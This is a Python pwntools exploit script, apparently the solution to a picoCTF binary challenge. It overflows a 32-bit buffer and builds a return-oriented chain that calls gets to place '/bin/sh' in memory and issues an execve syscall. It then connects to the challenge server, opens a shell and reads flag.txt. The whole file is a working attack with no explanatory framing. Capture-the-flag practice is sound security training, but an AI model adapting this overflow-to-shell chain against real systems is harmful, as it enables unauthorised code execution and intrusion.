#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "i386"
context.os = "linux"

GETS = elf.symbols["gets"]
BSS = elf.bss()
SAVED_EBX = 0x080e5000
SAVED_EBP_FILL = 0xdeadbeef
POP_EBP_RET = 0x08049849
POP_EAX_RET = 0x080b073a
POP_EDX_EBX_RET = 0x080583b9
POP_ECX_RET = 0x08049e29
INT_0x80 = 0x0804a3c2

payload  = b"A" * 20
payload += p32(SAVED_EBX)
payload += p32(SAVED_EBP_FILL)
payload += p32(GETS)
payload += p32(POP_EBP_RET)
payload += p32(BSS)
payload += p32(POP_EAX_RET)
payload += p32(0xb)
payload += p32(POP_EDX_EBX_RET)
payload += p32(0)
payload += p32(BSS)
payload += p32(POP_ECX_RET)
payload += p32(0)
payload += p32(INT_0x80)

io = remote("saturn.picoctf.net", 62952)
io.recvuntil(b"grasshopper!\n")
io.sendline(payload)
io.sendline(b"/bin/sh")
io.sendline(b"cat flag.txt")
flag = io.recvline(timeout=10)
if flag:
    print(flag.decode().strip())
io.close()
